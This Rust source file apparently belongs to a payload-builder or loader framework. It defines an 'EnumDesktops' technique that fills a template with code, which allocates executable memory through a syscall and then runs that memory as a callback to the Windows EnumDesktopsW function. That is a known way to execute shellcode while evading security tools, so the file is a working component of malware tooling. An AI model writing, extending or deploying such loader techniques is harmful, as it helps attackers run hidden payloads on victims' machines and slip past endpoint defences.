use crate::techniques::{BuildContext, Technique, TechniqueMeta};

pub struct EnumDesktops;

impl Technique for EnumDesktops {
    fn meta(&self) -> &'static TechniqueMeta { &ENUM_DESKTOPS_META }

    fn apply(&self, ctx: &mut BuildContext) -> anyhow::Result<()> {
        ctx.set_template("callbackExec");
        let body = r#"
        let addr = syscall_alloc_exec(&vec);
        if addr.is_null() { return; }
        winapi::um::winuser::EnumDesktopsW(
            winapi::um::winuser::GetProcessWindowStation(),
            Some(std::mem::transmute(addr)),
            0,
        );
"#;
        ctx.set_replacement("{{CALLBACK_INVOKE}}", body.to_string());
        Ok(())
    }
}

pub use super::super::ENUM_DESKTOPS_META;
